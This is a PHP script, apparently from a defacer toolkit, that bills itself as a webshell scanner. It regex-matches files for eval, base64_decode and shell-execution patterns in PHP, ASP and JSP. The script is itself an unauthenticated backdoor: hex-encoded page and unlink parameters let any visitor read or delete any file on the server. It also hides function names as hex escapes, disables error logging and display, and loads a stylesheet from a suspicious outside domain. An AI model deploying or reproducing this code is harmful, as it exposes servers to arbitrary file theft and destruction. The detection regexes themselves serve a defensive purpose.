<?php
if(isset($_GET['page'])){
    $file = hex2bin($_GET['page']);
    echo '<center>Contents of file:<br><textarea style="width: 1507px; height: 396px;">'.htmlspecialchars(file_get_contents($file)).'</textarea><br><button onclick="history.back()">Go Back</button></center>';
}
elseif(isset($_GET['unlink'])){
    $nama_file = hex2bin($_GET['unlink']);

if (!unlink($nama_file)) {
  echo 'Gagal menghapus file<br><button onclick="history.back()">Go Back</button>';
} else {
  echo 'File berhasil dihapus<br><button onclick="history.back()">Go Back</button>';
}
}
else{


$roa = [
    "\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65",
    "\x66\x75\x6E\x63\x74\x69\x6F\x6E\x5F\x65\x78\x69\x73\x74\x73",
    "\x69\x6E\x69\x5F\x73\x65\x74",
];
@$GLOBALS['roa'][2]('error_log', NULL);
@$GLOBALS['roa'][2]('log_errors', 0);
@$GLOBALS['roa'][2]('max_execution_time', 0);
@$GLOBALS['roa'][2]('output_buffering', 0);
@$GLOBALS['roa'][2]('display_errors', 0);
@$GLOBALS['roa'][2]('ignore_user_abort', 1);
    $scandir = scandirr();

    $typearr = isset($_POST["dir"]) ? $_POST["types"] : ["php" => ".php"];
    echo '<link rel="stylesheet" href="//xnxx.co.ws/meki.css"><center><br /><form method="POST">';
    echo '<table class="tables"><tr><th>Name</th><th>Setup</th></tr>';
    echo '<tr><th>Scan path</th><th><input type="text" class="form-control btn-sm" name="dir" required value="' .
        htmlspecialchars($scandir) .
        '" style="width:345px;"> (Regular matching)</th></tr>';
    echo "<tr><th>Type of killing</th><th>";
    $types = [
        "php" =>
            ".ph",
        "asp+aspx" => ".as|.cs|.cer",
        "jsp" => ".jsp",
    ];
    foreach ($types as $key => $ex) {
        echo '<label title="' .
            $ex .
            '"><input type="checkbox" name="types[' .
            $key .
            ']" value="' .
            $ex .
            '"' .
            ($typearr[$key] == $ex ? " checked" : "") .
            ">" .
            $key .
            "</label>";
    }
    echo '</th></tr><tr><th>Action</th><th><div class="d-grid gap-2"><input class="btn btn-dark btn-sm" type="submit" name="wa" value="Go"></div></th></tr>';
    echo "</form></center>";
    if(!empty($_POST['types'])){
        echo '</table><table class="tables"><tr><th>Code</th><th>PATH</th><th>Options</th><th>Last Modified</th><th>Creation time</th></tr>';
    if (is_countable($_POST["types"]) && count($_POST["types"]) > 0) {
        $matches = [
            "php" => [
                '/halt|rawurldecode|gzinflate|gzdeflate|str_rot13|uhex|hex|bin2hex|hex2bin|base64\\_decode|stream\\_get\\_meta\\_data|function\\_exists\\s*\\(\\s*[\'|\\"](popen|exec|proc\\_open|system|passthru)+[\'|\\"]\\s*\\)/i',
                '/(halt|rawurldecode|gzinflate|gzdeflate|str_rot13|uhex|hex|bin2hex|hex2bin|base64\\_decode|stream\\_get\\_meta\\_data|exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(GET|POST|COOKIE|SERVER|SESSION)+\\[(.*)\\]\\s*\\)/i',
                "/(udp\\:\\/\\/(.*)\\;)+/i",
                '/preg\\_replace\\s*\\((.*)\\/e(.*)\\,\\s*\\$\\_(.*)\\,(.*)\\)/i',
                '/preg\\_replace\\s*\\((.*)\\(base64\\_decode\\(\\$/i',
                "/(halt|eval|assert|include|require)+\\s*\\((.*)(base64\\_decode|file\\_get\\_contents|php\\:\\/\\/input)+/i",
                '/(halt|rawurldecode|gzinflate|gzdeflate|str_rot13|uhex|hex|bin2hex|hex2bin|base64\\_decode|stream\\_get\\_meta\\_data|eval|assert|include|require|array\\_map)+\\s*\\(\\s*\\$\\_(GET|POST|COOKIE|SERVER|SESSION)+\\[(.*)\\]\\s*\\)/i',
                '/\\$\\_(GET|POST|COOKIE|SERVER|SESSION)+(.*)(eval|assert|include|require)+\\s*\\(\\s*\\$(\\w+)\\s*\\)/i',
                '/\\$\\_(GET|POST|COOKIE|SERVER|SESSION)+\\[(.*)\\]\\(\\s*\\$(.*)\\)/i',
                '/\\(\\s*\\$\\_FILES\\[(.*)\\]\\[(.*)\\]\\s*\\,\\s*\\$\\_FILES\\[(.*)\\]\\[(.*)\\]\\s*\\)/i',
                '/(halt|rawurldecode|gzinflate|gzdeflate|str_rot13|uhex|hex|bin2hex|hex2bin|base64\\_decode|stream\\_get\\_meta\\_data|fopen|fwrite|fputs|file\\_put\\_contents)+\\s*\\((.*)\\$\\_(GET|POST|COOKIE|SERVER|SESSION)+\\[(.*)\\](.*)\\)/i',
                '/echo\\s*curl\\_exec\\s*\\(\\s*\\$(\\w+)\\s*\\)/i',
                '/new com\\s*\\(\\s*[\'|\\"]shell(.*)[\'|\\"]\\s*\\)/i',
                '/\\$(.*)\\s*\\((.*)\\/e(.*)\\,\\s*\\$\\_(.*)\\,(.*)\\)/i',
                '/\\$\\_\\=(.*)\\$\\_/i',
            ],
            "asp+aspx" => [
                "/(VBScript\\.Encode|WScript\\.shell|Shell\\.Application|Scripting\\.FileSystemObject)+/i",
                "/(eval|execute)+(.*)(request|session)+\\s*\\((.*)\\)/i",
                "/(eval|execute)+(.*)request.item\\s*\\[(.*)\\]/i",
                "/request\\s*\\((.*)\\)(.*)(eval|execute)+\\s*\\((.*)\\)/i",
                "/\\<script\\s*runat\\s*\\=(.*)server(.*)\\>(.*)\\<\\/script\\>/i",
                "/Load\\s*\\((.*)Request/i",
                "/StreamWriter\\(Server\\.MapPath(.*)\\.Write\\(Request/i",
            ],
            "jsp" => [
                "/(eval|execute)+(.*)(request|session)+\\s*\\((.*)\\)/i",
                "/(eval|execute)+(.*)request.item\\s*\\[(.*)\\]/i",
                "/request\\s*\\((.*)\\)(.*)(eval|execute)+\\s*\\((.*)\\)/i",
                "/Runtime\\.getRuntime\\(\\)\\.exec\\((.*)\\)/i",
                "/FileOutputStream\\(application\\.getRealPath(.*)request/i",
            ],
        ];
        flush();
        ob_flush();
        //echo '<div style="padding:5px;background:#F8F8F8;text-align:left;">';
        $isread = antivirus(
            strdir($scandir . "/"),
            $typearr,
            $matches,
            $nowdir
        );
        echo ($isread ? "<br>Scan Complete" : "<br>Scan Failed");
    }
}
}
function antivirus($dir, $exs, $matches, $now)
{
    
    $handle = opendir($dir);
    if (!$handle) {
        return false;
    }
    while ($name = readdir($handle)) {
        if ($name == "." || $name == "..") {
            continue;
        }
        $path = $dir . $name;
        if (is_dir($path)) {
            if (is_readable($path)) {
                antivirus($path . "/", $exs, $matches, $now);
            }
        } else {
            $iskill = null;
            foreach ($exs as $key => $ex) {
                if (find(explode("|", $ex), $name)) {
                    $iskill = $key;
                    break;
                }
            }
            if (strpos(size(filesize($path)), "M")) {
                continue;
            }
            if ($iskill) {
                $code = filer($path);
                foreach ($matches[$iskill] as $matche) {
                    $array = [];
                    preg_match($matche, $code, $array);
                    if (
                        strpos($array[0], '$this->') ||
                        strpos($array[0], '[$vars[')
                    ) {
                        continue;
                    }
                    $len = strlen($array[0]);
                    if ($len > 10 && $len < 150) {
                        $file = strtr($path, [
                            $now => "",
                            '\'' => "%27",
                            '"' => "%22",
                        ]);
                        echo '<tr><th>'.htmlspecialchars($array[0]).'</th><th>'.$path.'</th><th><a href="?page='.bin2hex($path).'">View</a> | <a href="?unlink='.bin2hex($path).'">Delete</a></th><th>'.date("Y-m-d H:i:s", filemtime($path)).'</th><th>'.date("Y-m-d H:i:s", filectime($path)).'</th></tr>' .
                        flush();
                        ob_flush();
                        break;
                    }
                }
                unset($code, $array);
            }
        }
    }
    closedir($handle);
    return true;
}
function strdir($str)
{
    return str_replace(
        ["\\", "//", "%27", "%22"],
        ["/", "/", '\'', '"'],
        chop($str)
    );
}
function find($array, $string)
{
    foreach ($array as $key) {
        if (stristr($string, $key)) {
            return true;
        }
    }
    return false;
}
function size($bytes)
{
    if ($bytes < 1024) {
        return $bytes . " B";
    }
    $array = ["B", "K", "M", "G", "T"];
    $floor = floor(log($bytes) / log(1024));
    return sprintf("%.2f " . $array[$floor], $bytes / pow(1024, floor($floor)));
}
function filer($filename)
{
    $handle = fopen($filename, "r");
    $filedata = fread($handle, filesize($filename));
    fclose($handle);
    return $filedata;
}
function scandirr(){
    if(empty($_POST['dir'])){
        return getcwd();
    }else{
        return $_POST['dir'];
    }
}